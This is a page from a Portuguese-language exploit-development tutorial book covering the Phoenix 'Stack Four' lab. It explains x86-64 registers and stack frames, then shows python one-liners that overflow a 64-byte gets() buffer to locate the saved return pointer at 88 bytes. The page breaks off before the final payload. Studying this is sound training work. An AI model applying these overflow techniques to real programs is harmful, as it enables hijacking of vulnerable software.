<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Stack Four - Um Livrinho Sobre Exploit Dev</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="../../">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/stack.html"><strong>2.</strong> Stack</a></li><li><a href="./stack/phoenix/setup.html"><strong>3.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>3.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>3.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>3.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>3.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html" class="active"><strong>3.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>3.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>3.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><a href="./stack/ret2libc.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six</li><li><strong>5.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>6.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.3.</strong> SROP</a></li><li><a href="./stack/rop/ret2dlresolve.html"><strong>7.4.</strong> ret2dl-resolve</a></li></ul></li><li><a href="./stack/ASLR/aslr.html"><strong>8.</strong> ASLR</a></li><li><ul class="section"><li><a href="./stack/ASLR/corromperGOT.html"><strong>8.1.</strong> Corromper GOT</a></li><li><a href="./stack/ASLR/ret2plt.html"><strong>8.2.</strong> ret2plt</a></li></ul></li><li><strong>9.</strong> Canary</li><li><strong>10.</strong> PIE</li><li><a href="./stack/leakAll.html"><strong>11.</strong> Extra: Leakando tudo</a></li><li class="spacer"></li><li><a href="./heap/heap.html"><strong>12.</strong> Heap</a></li><li><a href="./heap/intro.html"><strong>13.</strong> Intro</a></li><li><strong>14.</strong> Bugs Gerais</li><li><ul class="section"><li><strong>14.1.</strong> UAF</li><li><ul class="section"><li><a href="./heap/geral/uaf/heap-two.html"><strong>14.1.1.</strong> Exploit Education: Heap Two</a></li></ul></li></ul></li><li><a href="./heap/relacionados/relacionados.html"><strong>15.</strong> Conceitos Relacionados</a></li><li><ul class="section"><li><a href="./heap/relacionados/io_list_all.html"><strong>15.1.</strong> _IO_list_all</a></li></ul></li><li><a href="./heap/malloc/intro.html"><strong>16.</strong> Atacando Malloc</a></li><li><ul class="section"><li><a href="./heap/malloc/teoria.html"><strong>16.1.</strong> Teoria</a></li><li><a href="./heap/malloc/fastbinsDup.html"><strong>16.2.</strong> Fastbins Dup</a></li><li><a href="./heap/malloc/HouseOfForce.html"><strong>16.3.</strong> House of Force</a></li><li><a href="./heap/malloc/HouseOfSpirit.html"><strong>16.4.</strong> House of Spirit</a></li><li><a href="./heap/malloc/unsafeUnlink.html"><strong>16.5.</strong> Unsafe Unlink</a></li><li><a href="./heap/malloc/safeUnlink.html"><strong>16.6.</strong> Safe Unlink</a></li><li><a href="./heap/malloc/PartialUnlink.html"><strong>16.7.</strong> Unsorted bins: Partial Unlink</a></li><li><a href="./heap/malloc/HouseOfOrange.html"><strong>16.8.</strong> House of Orange</a></li><li><a href="./heap/malloc/HouseOfLore.html"><strong>16.9.</strong> House of Lore</a></li><li><strong>16.10.</strong> House of Rust</li><li><strong>16.11.</strong> House of Corrosion</li><li><strong>16.12.</strong> House of Einherjar</li></ul></li><li><strong>17.</strong> Extra</li><li class="spacer"></li><li><a href="./linux_internals/linux.html"><strong>18.</strong> Linux Internals</a></li><li><a href="./linux_internals/prerequisitos.html"><strong>19.</strong> Prerequisitos</a></li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <ul>
<li><a href="./stack/phoenix/StackFour.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="./stack/phoenix/StackFour.html#-conhecimento-preliminar">🛸 Conhecimento preliminar</a>
<ul>
<li><a href="./stack/phoenix/StackFour.html#-assembly">🤖 Assembly</a>
<ul>
<li><a href="./stack/phoenix/StackFour.html#-register-registos--registadores">📦 Register (Registos / Registadores)</a>
<ul>
<li><a href="./stack/phoenix/StackFour.html#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</a></li>
<li><a href="./stack/phoenix/StackFour.html#-address-register--armazenam-endere%C3%A7os-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></li>
<li><a href="./stack/phoenix/StackFour.html#-rflag">🏁 RFLAG</a></li>
<li><a href="./stack/phoenix/StackFour.html#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackFour.html#-instru%C3%A7%C3%B5es">⚡ Instruções</a></li>
<li><a href="./stack/phoenix/StackFour.html#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">🦄 Funções, Prólogo e Epílogo</a>
<ul>
<li><a href="./stack/phoenix/StackFour.html#-revis%C3%A3o">☕ Revisão</a></li>
<li><a href="./stack/phoenix/StackFour.html#%EF%B8%8F-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></li>
<li><a href="./stack/phoenix/StackFour.html#-pr%C3%B3logo">🔒 Prólogo</a>
<ul>
<li><a href="./stack/phoenix/StackFour.html#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackFour.html#salvar-o-frame-atual">Salvar o frame atual</a></li>
<li><a href="./stack/phoenix/StackFour.html#criar-novo-frame">Criar novo frame</a></li>
<li><a href="./stack/phoenix/StackFour.html#-ep%C3%ADlogo">🔑 Epílogo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="./stack/phoenix/StackFour.html#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></li>
<li><a href="./stack/phoenix/StackFour.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="./stack/phoenix/StackFour.html#-analisar-o-programa">🔬 Analisar o programa</a></li>
<li><a href="./stack/phoenix/StackFour.html#%EF%B8%8F-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></li>
<li><a href="./stack/phoenix/StackFour.html#-encontrar-endere%C3%A7o-de-complete_level">🏠 Encontrar endereço de complete_level</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackFour.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<a class="header" href="./stack/phoenix/StackFour.html#-objetivo" id="-objetivo"><h1>🎯 Objetivo</h1></a>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
<p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>,
caso você goste de siglas)! :D</p>
<p>Se você souber inglês, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<a class="header" href="./stack/phoenix/StackFour.html#-conhecimento-preliminar" id="-conhecimento-preliminar"><h1>🛸 Conhecimento preliminar</h1></a>
<p>Se tem uma seção inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de segurança está firme e travado,
mantenha as mãos, pernas e canecas de café dentro do veículo durante todo o percurso!</p>
<p>3...2...1....</p>
<a class="header" href="./stack/phoenix/StackFour.html#-assembly" id="-assembly"><h2>🤖 Assembly</h2></a>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdução Engenharia Reversa</a> \</p>
<p>Eu pretendo fazer uma serie de tutorias dedicada à assembly (ASM), porém isso é para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq é a melhor e se alguém te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM é uma representação legível dos 0s e 1s das instruções do computador.
Ela pode ser transformada em machine code (código de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assiste
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<a class="header" href="./stack/phoenix/StackFour.html#-register-registos--registadores" id="-register-registos--registadores"><h3>📦 Register (Registos / Registadores)</h3></a>
<blockquote>
<p>Registers são pedaços de memória que ficam dentro do chip do processador,
semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
</blockquote>
<p>O seu tamanho é um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers são semelhantes à variáveis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<a class="header" href="./stack/phoenix/StackFour.html#-general-purpose-registers-gpr--registo-de-propósito-geral-" id="-general-purpose-registers-gpr--registo-de-propósito-geral-"><h4>🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</h4></a>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo).</p>
<blockquote>
<p>Por exemplo: AX (16 bits, endereços: 0 a 15) (uma versão antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O propósito deles historicamente costumava ser, mas não exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para operações_lógicas ou aritméticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras operações_cíclicas 
RDX Dados        -&gt; Multiplicação, input/output
R8 a 15          -&gt; você só precisa saber que eles existem
</code></pre>
<p>Alem disso, são usados para passar os argumentos para funções (explicação em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parâmetro)
RSI (2º parâmetro)
RDX (3º parâmetro)
...
</code></pre>
<p>Para os nossos propósitos, é mais vantajoso considerar que eles só servem para
armazenar valores e passar argumentos</p>
<a class="header" href="./stack/phoenix/StackFour.html#-address-register--armazenam-endereços-da-stack-" id="-address-register--armazenam-endereços-da-stack-"><h4>💫 Address Register ( armazenam endereços da stack )</h4></a>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução 
                                que está sendo executada 
</code></pre>
<a class="header" href="./stack/phoenix/StackFour.html#-rflag" id="-rflag"><h4>🏁 RFLAG</h4></a>
<p>O register RFLAG armazena flags: sinais que indicam resultados de operações passadas.
Esses sinais são 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posição    Nome         Descrição 
0          Carry         Resultado estourou o limite de um inteiro
                                sem sinal (o &quot;vai-um&quot; da matemática)
6          Zero          A operação resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<a class="header" href="./stack/phoenix/StackFour.html#-apêndice---curiosidade--nomenclatura-histórica" id="-apêndice---curiosidade--nomenclatura-histórica"><h4>🧠 Apêndice - Curiosidade : Nomenclatura histórica</h4></a>
<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele é chamado RAX e tem o tamanho de 2 EAX

Para propósitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por trás das cenas, o computador interpreta EAX como a segunda metade do RAX

Então não estranhe caso alguém fale de EIP numa
arquitetura x64, pois na linguagem informal não faz diferença

Mas caso você vá analisar o register em um debugger, a diferença importa :D
</code></pre>
<a class="header" href="./stack/phoenix/StackFour.html#-instruções" id="-instruções"><h3>⚡ Instruções</h3></a>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu propósito na realidade não é relevante para a explicação !</p>
</blockquote>
<p>As instruções são o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da operação vem primeiro e o &quot;parâmetro&quot; depois</p>
<p>Caso os dois argumentos da instrução sejam valores, a operação executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtração 4 - 1 = 3
                 Caso fosse ao contrário a ordem &quot;alvo&quot; &quot;parâmetro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instruções que serão importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; Só remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do parâmetro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no epílogo ( explicadas em breve )
           ret     -&gt; retorna da função ( em essência é só um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores lógicos, têm o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localização incondicionalmente,
            equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
             (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ≤
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
</code></pre>
<p>Caso vc não saiba os operadores lógicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador Lógico</a></p>
<a class="header" href="./stack/phoenix/StackFour.html#-funções-prólogo-e-epílogo" id="-funções-prólogo-e-epílogo"><h3>🦄 Funções, Prólogo e Epílogo</h3></a>
<p>Agora tá na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, então é bom dar uma revisada, né?</p>
<a class="header" href="./stack/phoenix/StackFour.html#-revisão" id="-revisão"><h4>☕ Revisão</h4></a>
<pre><code>- A stack é como uma pilha de pratos: último a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A memória é representada de cabeça pra baixo!
    - A base fica em um endereço maior (parte de baixo)
    - O topo fica em um endereço menor (parte de cima)
    - Portanto, a stack cresce em direção à valores menores :D 

</code></pre>
<a class="header" href="./stack/phoenix/StackFour.html#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-"><h4>🖼️ Stack Frame ( Moldura da Stack )</h4></a>
<p>Você se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A região entre os dois é chamada de stack frame: um pedaço da stack :D</p>
<p>A stack como um todo possui vários stack frames, porém só um está ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Prólogo e Epílogo, respectivamente.</p>
<blockquote>
<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente</p>
</blockquote>
<p>Quando chamamos uma <strong>função()</strong>, precisamos criar um frame novo para ela por meio de um Prólogo, e salvar o endereço do frame atual. Ao retornar, esse frame será destruído com um Epílogo e o antigo será restaurado !</p>
<p>Para a explicação, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly é legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> são definidas e nos já sabemos como isso funciona, agora vamos chamar a função, que é aonde a mágica acontece !</p>
<a class="header" href="./stack/phoenix/StackFour.html#-prólogo" id="-prólogo"><h4>🔒 Prólogo</h4></a>
<ul>
<li>Se a função receber argumentos, passar eles
Chamar a função</li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a função</li>
</ul>
<a class="header" href="./stack/phoenix/StackFour.html#se-a-função-receber-argumentos-salvar-eles" id="se-a-função-receber-argumentos-salvar-eles"><h5>Se a função receber argumentos, salvar eles</h5></a>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos são passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parâmetro)
RSI (2º parâmetro)
RDX (3º parâmetro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necessário dar um push neles, e restaura-los no epilogo</p>
</blockquote>
<a class="header" href="./stack/phoenix/StackFour.html#salvar-o-frame-atual" id="salvar-o-frame-atual"><h4>Salvar o frame atual</h4></a>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porém não o valor atual,
           ; e sim o endereço da próxima instrução 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<a class="header" href="./stack/phoenix/StackFour.html#criar-novo-frame" id="criar-novo-frame"><h4>Criar novo frame</h4></a>
<p>Agora, para criar um novo frame, precisamos subir o rbp até o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; até o rsp
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localização
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função</p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a função precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Variáveis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse método de chamar função, não importa a localização da memória de quando a função foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma função chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destruído ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execução normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo então pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a função
</code></pre>
<a class="header" href="./stack/phoenix/StackFour.html#-epílogo" id="-epílogo"><h4>🔑 Epílogo</h4></a>
<p>O epilogo é bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instruções               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp até o rbp)</p>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...                    
Variáveis print dois   A região não é apagada, pois consumiria processamento a toa!
...         O valores ficam largados lá até uma nova função escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatório
...         Eles pode ser ignorado pois nem está mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code>
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instrução
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instrução &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado graças ao rbp e rip salvos ( o rip salvo é chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<a class="header" href="./stack/phoenix/StackFour.html#-caso-você-tenha-viajado-o-que-você-precisa-saber" id="-caso-você-tenha-viajado-o-que-você-precisa-saber"><h1>🌍 Caso você tenha viajado, o que você precisa saber</h1></a>
<p>Existem algumas variáveis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução que está sendo executada 
</code></pre>
<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variáveis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na função
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exercícios anteriores, também conseguimos
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execução do programa!</p>
<a class="header" href="./stack/phoenix/StackFour.html#-exploit" id="-exploit"><h1>🔥 Exploit</h1></a>
<a class="header" href="./stack/phoenix/StackFour.html#-analisar-o-programa" id="-analisar-o-programa"><h2>🔬 Analisar o programa</h2></a>
<p>O programa contem 3 funções: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do começo do nível e chama start_level</p>
<p><code>complete_level</code> é a função que precisamos chamar</p>
<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulnerável) é chamada num <code>buffer[64]</code></p>
<a class="header" href="./stack/phoenix/StackFour.html#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa"><h2>⁉️ O compilador adicionou coisa???</h2></a>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A função normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip não mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplicações mais complexas, essa diferença pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferença usando ferramentas como fuzzers ou geradores de padrão...</p>
<p>Como nosso exemplo é simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apoś <strong>88</strong> bytes, temos o SRP :D</p>
<a class="header" href="./stack/phoenix/StackFour.html#-encontrar-endereço-de-complete_level" id="-encontrar-endereço-de-complete_level"><h2>🏠 Encontrar endereço de complete_level</h2></a>
<p>Você se lembra como faz? Nos usamos no exercício passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora é a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endereço:</p>
